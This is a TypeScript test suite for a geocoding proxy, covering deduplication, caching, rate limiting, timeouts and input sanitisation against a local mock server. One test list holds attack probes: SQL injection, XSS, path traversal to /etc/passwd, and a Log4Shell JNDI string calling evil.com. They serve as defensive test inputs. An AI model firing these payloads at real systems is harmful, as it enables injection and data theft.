import { describe, it, before, after, beforeEach } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import {
  executeGeocode,
  GeocodingError,
  InMemoryTtlCache,
  InFlightDeduplicator,
  SequentialRateLimiter,
  sanitizeAndNormalizeQuery,
  type GeocodeResultItem,
} from "../src/server/geocoding/proxy.ts";

let mockServer: http.Server;
let mockPort: number;
let mockMode: "normal" | "slow" | "rate_limited" | "error" | "malformed" =
  "normal";
let receivedHeaders: Record<string, string | string[] | undefined> = {};
let receivedUrls: string[] = [];
let upstreamRequestCount = 0;

before(async () => {
  mockServer = http.createServer((req, res) => {
    upstreamRequestCount++;
    receivedHeaders = req.headers;
    receivedUrls.push(req.url ?? "");

    if (mockMode === "rate_limited") {
      res.writeHead(429, { "Content-Type": "text/plain" });
      res.end("Too Many Requests");
      return;
    }

    if (mockMode === "error") {
      res.writeHead(500, { "Content-Type": "text/plain" });
      res.end("Internal Server Error");
      return;
    }

    if (mockMode === "malformed") {
      res.writeHead(200, { "Content-Type": "text/html" });
      res.end("<html><body>Not JSON</body></html>");
      return;
    }

    if (mockMode === "slow") {
      // Delay response by 3000ms for timeout testing
      setTimeout(() => {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify([]));
      }, 3000);
      return;
    }

    // Default successful response
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(
      JSON.stringify([
        {
          place_id: 201,
          display_name: "SMK Negeri 2 Magelang, Jl. Perintis Kemerdekaan No.34",
          lat: "-7.481234",
          lon: "110.219876",
          type: "school",
          class: "amenity",
          importance: 0.85,
        },
      ]),
    );
  });

  await new Promise<void>((resolve) => {
    mockServer.listen(0, "127.0.0.1", () => {
      const addr = mockServer.address();
      if (typeof addr === "object" && addr !== null) {
        mockPort = addr.port;
      }
      resolve();
    });
  });
});

after(async () => {
  await new Promise<void>((resolve) => {
    mockServer.close(() => resolve());
  });
});

describe("Empirical Challenger M4 Stress Test Suite", () => {
  let testCache: InMemoryTtlCache<GeocodeResultItem[]>;
  let testDeduplicator: InFlightDeduplicator<GeocodeResultItem[]>;
  let testRateLimiter: SequentialRateLimiter;

  beforeEach(() => {
    mockMode = "normal";
    receivedHeaders = {};
    receivedUrls = [];
    upstreamRequestCount = 0;
    testCache = new InMemoryTtlCache<GeocodeResultItem[]>(50, 86_400_000);
    testDeduplicator = new InFlightDeduplicator<GeocodeResultItem[]>();
    testRateLimiter = new SequentialRateLimiter(20, 500); // 20ms interval for tests
  });

  describe("1. Concurrency Deduplication Stress", () => {
    it("deduplicates 10 simultaneous identical queries into exactly 1 upstream request", async () => {
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: testRateLimiter,
      };

      const promises = Array.from({ length: 10 }, () =>
        executeGeocode("Magelang Utara", opts),
      );

      const results = await Promise.all(promises);

      assert.equal(
        upstreamRequestCount,
        1,
        `Expected exactly 1 upstream call for 10 concurrent requests, got ${upstreamRequestCount}`,
      );

      // Verify all results received identical data
      for (const res of results) {
        assert.equal(res.data.length, 1);
        assert.equal(res.data[0]?.place_id, "201");
      }

      // At least 9 results must be marked deduplicated
      const deduplicatedCount = results.filter((r) => r.deduplicated).length;
      assert.equal(
        deduplicatedCount,
        9,
        `Expected exactly 9 requests to be flagged as deduplicated, got ${deduplicatedCount}`,
      );
    });

    it("cleans up in-flight map even if upstream fetch fails", async () => {
      mockMode = "error";
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: testRateLimiter,
      };

      await assert.rejects(async () => {
        await Promise.all([
          executeGeocode("Simpang Lima", opts),
          executeGeocode("Simpang Lima", opts),
        ]);
      });

      assert.equal(
        testDeduplicator.size(),
        0,
        "Deduplicator internal in-flight map must be empty after error",
      );

      // Subsequent request after failure must be allowed to try again
      mockMode = "normal";
      const recovery = await executeGeocode("Simpang Lima", opts);
      assert.equal(recovery.data.length, 1);
    });
  });

  describe("2. Cache Hit Verification & In-Memory TTL", () => {
    it("second identical query returns cached: true and does not hit upstream", async () => {
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: testRateLimiter,
      };

      const first = await executeGeocode("Candi Pawon", opts);
      assert.equal(first.cached, false);
      assert.equal(upstreamRequestCount, 1);

      const second = await executeGeocode("Candi Pawon", opts);
      assert.equal(second.cached, true);
      assert.equal(second.deduplicated, false);
      assert.equal(
        upstreamRequestCount,
        1,
        "Upstream count must remain 1 on cache hit",
      );
      assert.deepEqual(first.data, second.data);
    });

    it("expires cache entries after TTL duration", async () => {
      const shortCache = new InMemoryTtlCache<GeocodeResultItem[]>(10, 50); // 50ms TTL
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: shortCache,
        deduplicator: testDeduplicator,
        rateLimiter: testRateLimiter,
      };

      const first = await executeGeocode("Ketep Pass", opts);
      assert.equal(first.cached, false);
      assert.equal(upstreamRequestCount, 1);

      // Wait 70ms for TTL to expire
      await new Promise((r) => setTimeout(r, 70));

      const second = await executeGeocode("Ketep Pass", opts);
      assert.equal(second.cached, false);
      assert.equal(
        upstreamRequestCount,
        2,
        "Upstream count must be 2 after cache expiration",
      );
    });

    it("evicts oldest entries when cache capacity is exceeded", () => {
      const capacityCache = new InMemoryTtlCache<string>(2, 60000);
      capacityCache.set("a", "1");
      capacityCache.set("b", "2");
      assert.equal(capacityCache.size(), 2);

      capacityCache.set("c", "3");
      assert.equal(capacityCache.size(), 2);
      assert.equal(
        capacityCache.get("a"),
        null,
        "Oldest key 'a' must be evicted",
      );
      assert.equal(capacityCache.get("b"), "2");
      assert.equal(capacityCache.get("c"), "3");
    });
  });

  describe("3. Rate Limit Enforcement & Queue Saturation", () => {
    it("spaces out requests according to minIntervalMs", async () => {
      const strictLimiter = new SequentialRateLimiter(60, 2000); // 60ms interval
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: strictLimiter,
      };

      const start = Date.now();
      await Promise.all([
        executeGeocode("Lokasi Satu", opts),
        executeGeocode("Lokasi Dua", opts),
        executeGeocode("Lokasi Tiga", opts),
      ]);
      const duration = Date.now() - start;

      // 3 requests spaced by 60ms must take at least 100ms
      assert.ok(
        duration >= 100,
        `Sequential limiter must space requests; total duration was ${duration}ms, expected >= 100ms`,
      );
    });

    it("triggers HTTP 429 when queue wait exceeds maxWaitMs", async () => {
      const tinyLimiter = new SequentialRateLimiter(200, 300); // interval 200ms, max wait 300ms
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: tinyLimiter,
      };

      // Query 1: wait 0ms -> OK
      // Query 2: wait 200ms -> OK (<= 300ms)
      // Query 3: wait 400ms -> EXCEEDS 300ms -> Throws 429
      const promise1 = executeGeocode("Alun-alun A", opts);
      const promise2 = executeGeocode("Alun-alun B", opts);
      const promise3 = executeGeocode("Alun-alun C", opts);

      const [res1, res2, err3] = await Promise.allSettled([
        promise1,
        promise2,
        promise3,
      ]);

      assert.equal(res1.status, "fulfilled");
      assert.equal(res2.status, "fulfilled");
      assert.equal(err3.status, "rejected");

      if (err3.status === "rejected") {
        const err = err3.reason as GeocodingError;
        assert.ok(err instanceof GeocodingError);
        assert.equal(err.statusCode, 429);
        assert.equal(err.code, "RATE_LIMITED");
        assert.ok(err.retryAfter !== undefined && err.retryAfter >= 1);
      }
    });
  });

  describe("4. Input Sanitization, Attack Probes & Boundary Conditions", () => {
    const invalidShortQueries = [
      "",
      "a",
      "ab",
      "   ",
      "  a  ",
      "  ab  ",
      "\x00\x01\x02",
      "\t\r\n",
    ];

    for (const q of invalidShortQueries) {
      it(`rejects short/empty query: ${JSON.stringify(q)} with HTTP 400`, async () => {
        await assert.rejects(
          async () => {
            await executeGeocode(q, {
              baseUrl: `http://127.0.0.1:${mockPort}`,
              cache: testCache,
              deduplicator: testDeduplicator,
              rateLimiter: testRateLimiter,
            });
          },
          (err: unknown) => {
            assert.ok(err instanceof GeocodingError);
            assert.equal(err.statusCode, 400);
            assert.equal(err.code, "INVALID_QUERY");
            return true;
          },
        );
      });
    }

    it("rejects query exceeding 100 characters with HTTP 400 QUERY_TOO_LONG", async () => {
      const longQuery = "a".repeat(101);
      await assert.rejects(
        async () => {
          await executeGeocode(longQuery, {
            baseUrl: `http://127.0.0.1:${mockPort}`,
            cache: testCache,
            deduplicator: testDeduplicator,
            rateLimiter: testRateLimiter,
          });
        },
        (err: unknown) => {
          assert.ok(err instanceof GeocodingError);
          assert.equal(err.statusCode, 400);
          assert.equal(err.code, "QUERY_TOO_LONG");
          return true;
        },
      );
    });

    it("safely sanitizes control characters without corrupting valid text", () => {
      const raw = "Jl.\x00 Pahlawan\x1F No.\x7F 10\t Magelang";
      const normalized = sanitizeAndNormalizeQuery(raw);
      // \x00, \x1F, \x7F removed, whitespace normalized
      assert.equal(normalized, "jl. pahlawan no. 10 magelang");
    });

    const adversarialProbes = [
      "' OR '1'='1",
      "'; DROP TABLE locations; --",
      "<script>alert('xss')</script>",
      "javascript:alert(1)",
      "../../../../etc/passwd",
      "%00%0a%0d",
      "{{7*7}}",
      "${jndi:ldap://evil.com/a}",
    ];

    for (const probe of adversarialProbes) {
      it(`handles attack probe without crash: ${probe}`, async () => {
        const opts = {
          baseUrl: `http://127.0.0.1:${mockPort}`,
          cache: testCache,
          deduplicator: testDeduplicator,
          rateLimiter: testRateLimiter,
        };

        const res = await executeGeocode(probe, opts);
        assert.ok(Array.isArray(res.data));
        assert.ok(receivedUrls.length > 0);
      });
    }
  });

  describe("5. Timeout & Malformed Upstream Handling", () => {
    it("returns HTTP 504 UPSTREAM_TIMEOUT when upstream exceeds timeoutMs", async () => {
      mockMode = "slow";
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: testRateLimiter,
        timeoutMs: 100, // fast timeout for test
      };

      await assert.rejects(
        async () => {
          await executeGeocode("Gunung Tidar", opts);
        },
        (err: unknown) => {
          assert.ok(err instanceof GeocodingError);
          assert.equal(err.statusCode, 504);
          assert.equal(err.code, "UPSTREAM_TIMEOUT");
          return true;
        },
      );
    });

    it("returns HTTP 502 MALFORMED_RESPONSE when upstream returns non-JSON", async () => {
      mockMode = "malformed";
      const opts = {
        baseUrl: `http://127.0.0.1:${mockPort}`,
        cache: testCache,
        deduplicator: testDeduplicator,
        rateLimiter: testRateLimiter,
      };

      await assert.rejects(
        async () => {
          await executeGeocode("Pasar Rejowinangun", opts);
        },
        (err: unknown) => {
          assert.ok(err instanceof GeocodingError);
          assert.equal(err.statusCode, 502);
          assert.equal(err.code, "MALFORMED_RESPONSE");
          return true;
        },
      );
    });
  });
});
